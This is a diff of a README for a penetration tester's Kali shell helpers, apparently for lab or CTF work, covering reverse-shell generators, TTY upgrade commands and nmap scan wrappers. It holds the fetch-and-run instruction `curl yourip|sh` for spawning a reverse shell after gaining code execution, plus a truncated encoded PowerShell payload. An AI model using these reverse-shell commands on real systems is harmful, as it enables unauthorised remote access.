@@ -30,11 +30,9 @@ Clipboard contents after:
 ```
 10.10.14.41
 ```
-> #### Notes
-> - Sudo is used to ensure being able to listen on port 80
 
 ### > mkdir_cd
-Often when making a directory I want to directly `cd` into it after. This does exactly that. 
+Often when making a directory I want to directly `cd` into it after. This does exactly that.  
 Example: 
 ```
 ┌──(jazz㉿kali)-[~/jazz]
@@ -46,7 +44,8 @@ Example:
 
 ## Reverse shells
 ### > gen_lin_rev $ip $port 
-Based on [RSaaS](https://github.com/lukechilds/reverse-shell). Creates a file called `index.html` in the current directory. This file contains multiple reverse shell payloads that will be attempted in sequence until one works. Can be used with `www` to make spawning a reverse shell after gaining RCE extremely easy and fast. Just make the target execute `curl yourip|sh` and it will retrieve the reverse shell payload from your webserver and -hopefully- connect back to your listener. Example: 
+Based on [RSaaS](https://github.com/lukechilds/reverse-shell). Creates a file called `index.html` in the current directory. This file contains multiple reverse shell payloads that will be attempted in sequence until one works. Can be used with `www` to make spawning a reverse shell after gaining RCE extremely easy and fast. Just make the target execute `curl yourip|sh` and it will retrieve the reverse shell payload from your webserver and -hopefully- connect back to your listener. 
+Example: 
 ```
 ┌──(jazz㉿kali)-[~]
 └─$ gen_lin_rev 127.0.0.1 1337
@@ -59,7 +58,7 @@ Based on [RSaaS](https://github.com/lukechilds/reverse-shell). Creates a file ca
 
 ### > gen_php_rev $ip $port
 
-Generates the [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) with the supplied ip and port and saves it in the current directory. 
+Generates the [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) with the supplied ip and port and saves it in the current directory.  
 Example: 
 ```
 ┌──(jazz㉿kali)-[~]
@@ -80,7 +79,7 @@ powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...
 
 ## TTY upgrades
 ### > py_tty_upgrade
-Copies the python(2) tty upgrade command to the clipboard.
+Copies the python(2) tty upgrade command to the clipboard. 
 Example: 
 ```
 ┌──(jazz㉿kali)-[~/jazz]
@@ -94,7 +93,7 @@ python -c "import pty;pty.spawn(/bin/bash)"
 > - Requires `xclip` to be installed
 
 ### > py3_tty_upgrade
-Exactly the same as above but with python3.
+Exactly the same as above but with python3. 
 Example: 
 ```
 ┌──(jazz㉿kali)-[~/jazz]
@@ -108,7 +107,7 @@ python3 -c "import pty;pty.spawn(/bin/bash)"
 > - Requires `xclip` to be installed
 
 ### > script_tty_upgrade
-When Python is not installed on the remote machine you can use this command to copy the `script` method to upgrade to a tty shell to your clipboard.
+When Python is not installed on the remote machine you can use this command to copy the `script` method to upgrade to a tty shell to your clipboard. 
 Example: 
 ```
 ┌──(jazz㉿kali)-[~/jazz]
@@ -156,7 +155,7 @@ Session completed.
 ```
 ## Portscanning
 ### > nmap_tcp $ip (extra arguments)
-Starts a TCP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist.
+Starts a TCP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist. 
 Example: 
 ```
 ┌──(jazz㉿kali)-[~]
@@ -169,7 +168,7 @@ Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT
 > - This only scans the default TCP ports. Add `-p` as an argument to scan all ports.
 > - Uses `sudo` to get the privileges required for a SYN scan
 ### > nmap_udp $ip (extra arguments)
-Starts an UDP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist.
+Starts an UDP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist. 
 Example: 
 ```
 ┌──(jazz㉿kali)-[~]
